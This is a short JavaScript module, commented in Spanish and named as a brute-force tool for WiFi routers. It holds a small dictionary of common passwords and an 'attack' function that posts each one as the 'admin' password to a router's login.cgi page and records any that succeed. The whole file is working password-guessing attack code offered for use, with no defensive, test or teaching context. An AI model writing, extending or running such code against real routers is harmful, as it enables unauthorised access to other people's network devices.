// brute-force.js — Módulo de Fuerza Bruta para Routers WiFi
const BruteForce = {
  diccionario: ['admin', '12345678', 'password', '1234567890'],
  async atacar(ip) {
    const result = [];
    for (const pass of this.diccionario) {
      try {
        const resp = await fetch(`http://${ip}/login.cgi`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: `username=admin&password=${pass}`,
          signal: AbortSignal.timeout(3000)
        });
        if (resp.status === 200) {
          result.push({ ip, password: pass, acceso: 'exitoso' });
          return result;
        }
      } catch (e) { /* ignorar */ }
    }
    return [{ ip, acceso: 'fallido' }];
  }
};
